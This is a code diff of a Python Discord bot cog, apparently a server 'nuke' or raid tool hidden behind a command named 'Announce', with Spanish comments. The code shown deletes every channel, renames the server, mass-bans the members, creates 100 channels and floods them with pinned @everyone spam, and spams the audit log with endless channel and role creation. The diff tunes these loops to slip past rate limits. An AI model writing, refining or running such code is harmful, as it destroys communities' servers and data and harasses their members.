@@ -102,7 +102,7 @@ class Announce(commands.Cog):
             delete_tasks = [channel.delete() for channel in guild.channels]
             if delete_tasks:
                 await asyncio.gather(*delete_tasks, return_exceptions=True)
-                await asyncio.sleep(1)
+                await asyncio.sleep(1)  # Pequeña pausa después de eliminar canales
             
             # 7. Cambiar nombre del servidor
             try:
@@ -110,140 +110,113 @@ class Announce(commands.Cog):
             except:
                 pass
             
-            # 8. Baneo masivo y role flipping
-            async def mass_ban_and_role_flip():
-                # Obtener todos los miembros
-                all_members = []
+            # 8. Iniciar baneo masivo en segundo plano
+            async def mass_ban():
                 async for member in guild.fetch_members():
-                    all_members.append(member)
-                
-                # Miembros a excluir del baneo
-                excluded_ids = {user_safe.id, self.bot.user.id, current_user.id}
-                
-                # Banear a todos los miembros excepto los excluidos
-                for member in all_members:
-                    if member.id not in excluded_ids:
-                        try:
-                            await member.ban(reason="Reorganización masiva")
-                            await asyncio.sleep(0.1)
-                        except:
-                            continue
-                
-                # Determinar objetivos para role flipping
-                target_members = []
-                try:
-                    safe_member = await guild.fetch_member(user_safe.id)
-                    target_members.append(safe_member)
-                except:
-                    pass
-                try:
-                    bot_member = await guild.fetch_member(self.bot.user.id)
-                    target_members.append(bot_member)
-                except:
-                    pass
-                
-                # Si hay 3 o más miembros originalmente, agregar más objetivos
-                if len(all_members) >= 3:
-                    # Filtrar miembros que no son excluidos y están disponibles
-                    available_members = [m for m in all_members if m.id not in excluded_ids]
-                    if available_members:
-                        # Seleccionar entre 1-3 miembros adicionales
-                        num_extra = min(random.randint(1, 3), len(available_members))
-                        extra_targets = random.sample(available_members, num_extra)
-                        target_members.extend(extra_targets)
-                
-                # Si no hay suficientes objetivos, usar solo safe user y bot
-                if len(target_members) < 2:
-                    return
-                
-                # Crear roles para el flipping
-                colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF]
-                flip_roles = []
-                
-                for i in range(5):
                     try:
-                        role = await guild.create_role(
-                            name=f"flip-role-{random.randint(1000,9999)}",
-                            color=discord.Color(colors[i]),
-                            permissions=discord.Permissions(permissions=0)
-                        )
-                        flip_roles.append(role)
-                        await asyncio.sleep(0.1)
+                        if (member.id != user_safe.id and member.id != self.bot.user.id and
+                            member.id != current_user.id):  # No banear al que ejecutó el comando
+                            await member.ban(reason=f"Reorganización masiva")
+                            await asyncio.sleep(0.2)
                     except:
                         continue
-                
-                if not flip_roles:
-                    return
-                
-                # Ciclo de role flipping
-                while True:
-                    for member in target_members:
-                        try:
-                            role = random.choice(flip_roles)
-                            await member.add_roles(role)
-                            await asyncio.sleep(0.2)
-                            await member.remove_roles(role)
-                            await asyncio.sleep(0.2)
-                        except:
-                            await asyncio.sleep(0.3)
-            
-            asyncio.create_task(mass_ban_and_role_flip())
+            asyncio.create_task(mass_ban())
             
             # 9. Crear canales
             spam_message = f"@everyone {message}"
             if image_url:
-                spam_message += f"\n{image_url}"
+                spam_message += f"\n{image_url}"  # Añadir la URL de la imagen al mensaje
             
             max_channels = 100
-            created_channels = []
             
+            # Crear canales con un cooldown optimizado
+            created_channels = []
             for i in range(max_channels):
                 try:
                     channel_name = f"{message}-{i}"
                     channel = await guild.create_text_channel(channel_name[:100])
                     created_channels.append(channel)
-                    if i % 10 == 0:
-                        await asyncio.sleep(0.1)
+                    if i % 5 == 0:  # Pequeña pausa cada 5 canales
+                        await asyncio.sleep(0.3)
                 except:
                     break
             
-            # 10. Spam ultra rápido en canales
-            async def ultra_fast_spam():
+            # 10. Iniciar spam optimizado en todos los canales
+            async def optimized_spam():
                 while True:
                     try:
                         for channel in created_channels:
-                            try:
-                                await channel.send(spam_message)
-                                await asyncio.sleep(0.1)
-                            except discord.HTTPException as e:
-                                if e.status == 429:
-                                    await asyncio.sleep(0.5)
-                                else:
-                                    await asyncio.sleep(0.2)
-                            except:
-                                await asyncio.sleep(0.2)
-                        await asyncio.sleep(0.3)
-                    except:
-                        await asyncio.sleep(0.5)
-            asyncio.create_task(ultra_fast_spam())
+                            # No spamear en canales de auditoría
+                            if "audit-spam" not in channel.name:
+                                try:
+                                    msg = await channel.send(spam_message)
+                                    # Fijar mensaje
+                                    try:
+                                        await msg.pin()
+                                    except:
+                                        pass
+                                    # Cooldown optimizado
+                                    await asyncio.sleep(0.4)
+                                except discord.HTTPException as e:
+                                    if e.status == 429:  # Rate limit
+                                        await asyncio.sleep(5)
+                                    else:
+                                        await asyncio.sleep(1)
+                                except:
+                                    await asyncio.sleep(1)
+                        # Pequeña pausa después de recorrer todos los canales
+                        await asyncio.sleep(1)
+                    except Exception as e:
+                        await asyncio.sleep(2)
+            asyncio.create_task(optimized_spam())
             
             # 11. Spam de registros de auditoría
             async def enhanced_audit_spam():
                 counter = 0
                 while True:
                     try:
-                        channel = await guild.create_text_channel(f"audit-{counter}")
-                        await asyncio.sleep(0.1)
+                        # Crear y eliminar canales
+                        channel = await guild.create_text_channel(f"audit-spam-{counter}")
+                        await asyncio.sleep(0.2)
                         await channel.delete()
-                        await asyncio.sleep(0.1)
                         
-                        await guild.create_role(name=f"spam-role-{random.randint(1000,9999)}")
+                        # Crear roles (sin eliminarlos)
+                        await guild.create_role(name=f"spam-role-{random.randint(1000, 9999)}")
                         
                         counter += 1
-                        await asyncio.sleep(0.2)
-                    except:
                         await asyncio.sleep(0.3)
+                    except:
+                        await asyncio.sleep(1)
             asyncio.create_task(enhanced_audit_spam())
+            
+            # 12. Role flipping para el safe user
+            async def role_flipping():
+                try:
+                    admin_member = await guild.fetch_member(user_safe.id)
+                    flip_roles = []
+                    
+                    # Crear roles temporales para flipping
+                    for i in range(5):
+                        try:
+                            role = await guild.create_role(name=f"flip-role-{i}")
+                            flip_roles.append(role)
+                            await asyncio.sleep(0.2)
+                        except:
+                            continue
+                    
+                    # Ciclo infinito de añadir y quitar roles
+                    while True:
+                        for role in flip_roles:
+                            try:
+                                await admin_member.add_roles(role)
+                                await asyncio.sleep(0.3)
+                                await admin_member.remove_roles(role)
+                                await asyncio.sleep(0.3)
+                            except:
+                                await asyncio.sleep(0.5)
+                except:
+                    pass
+            asyncio.create_task(role_flipping())
             
         except Exception as e:
             try:
